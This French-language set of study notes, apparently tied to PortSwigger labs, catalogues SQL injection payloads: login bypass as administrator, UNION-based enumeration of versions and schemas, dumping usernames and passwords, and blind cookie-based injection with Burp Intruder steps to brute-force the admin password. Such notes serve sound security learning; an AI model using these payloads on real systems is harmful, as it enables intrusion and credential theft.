# SQL Injection

## Récupération de données cachées

Afficher les articles cachés d'un shop :

```
https://insecure-website.com/products?category=Gifts'--
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

```
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

## Détournement de la logique applicative

Contourner le formulaire de login avec le compte admin : 

```
user : administrator'--
password : test
```

```
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

## Examiner la base de données

## Afficher la version

```
MySQL, Microsoft : '+UNION+SELECT+@@version--
Oracle : '+UNION+SELECT+banner+FROM+v$version--
PostgreSQL : '+UNION+SELECT+version()--
```

## Afficher la table "information_schema"

```
'+UNION+SELECT+*+FROM+information_schema.tables--
```

Cheat Sheet dispo ici pour les BDD spécifiques : https://portswigger.net/web-security/sql-injection/cheat-sheet


## Récupérer un ensemble de données d'autres tables

1) Déterminer le nombre de colonnes renvoyés :

```
'+ORDER+BY+1--
'+ORDER+BY+2--
'+ORDER+BY+3--
etc. -> IF ERROR THEN OK, WE HAVE 3 COLUMNS

'+UNION+SELECT+NULL--
'+UNION+SELECT+NULL,NULL--
'+UNION+SELECT+NULL,NULL,NULL--
etc. -> IF ERROR DISAPPEAR THEN OK, WE HAVE 3 COLUMNS


FOR ORACLE DATABASE :
'+UNION+SELECT+NULL+FROM+DUAL--
'+UNION+SELECT+NULL,NULL+FROM+DUAL--
etc.
```

2) Déterminer les types de données

Vérifier une par une les colonnes afin de vérifier s'il renvoient une chaîne de caractères :

```
'+UNION+SELECT+'a',NULL,NULL--
'+UNION+SELECT+NULL,'a',NULL--
'+UNION+SELECT+NULL,NULL,'a'--
etc. -> If no error in a column, then it is fine to retrieve the data.
```
3) Récupérer des données sensibles
   
Précédemment nous avons trouver 2 colonnes de type chaîne de caractères, alors nous pouvons essayer de récupérer les données avec des noms de colonnes assez commun, comme "username" et "password" :

```
'+UNION+SELECT+username,password+FROM+users--
```

## Récupérer des données dans une seule colonne

```
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

## Blind SQL

### Déclencher des réponses conditionnelles

```
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'+AND+'1'='1 --> toujours vrai donc le serveur renvoi une réponse
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4'+AND+'1'='2 --> pas vrai, donc le serveur ne renvoi rien
```

### Vérifier l'existence d'une table

```
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+LIMIT 1)='a
```

### Vérifier l'existence d'un compte utilisateur

```
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator')='a
```

### Déterminer la longueur du mot de passe 

```
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>1)='a
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>2)='a
TrackingId=xyz'+AND+(SELECT+'a'+FROM+users+WHERE+username='administrator'+AND+LENGTH(password)>3)='a
etc.
```

### Tester chaques caractères du mot de passe

1) Transmettre cette requête dans Burp intruder, et marquer la position du payload sur "1" et "a" : 

```
TrackingId=xyz'+AND+(SELECT+SUBSTRING(password,§1§,1)+FROM+users+WHERE+username='administrator')='§a§
```

2) Utiliser une "attack type - cluster bomb".

3) Puis 2 payloads : 

```
- Payload set 1-1, type number -> sequential 1 to 20
- Payload set 2-a, type brute forcer -> abcdefghijklmnopqrstuvwxyz0123456789
```

4) Et enfin allez dans ```"Options > Grep - Match"```, puis ```"Add > Welcome back!"```
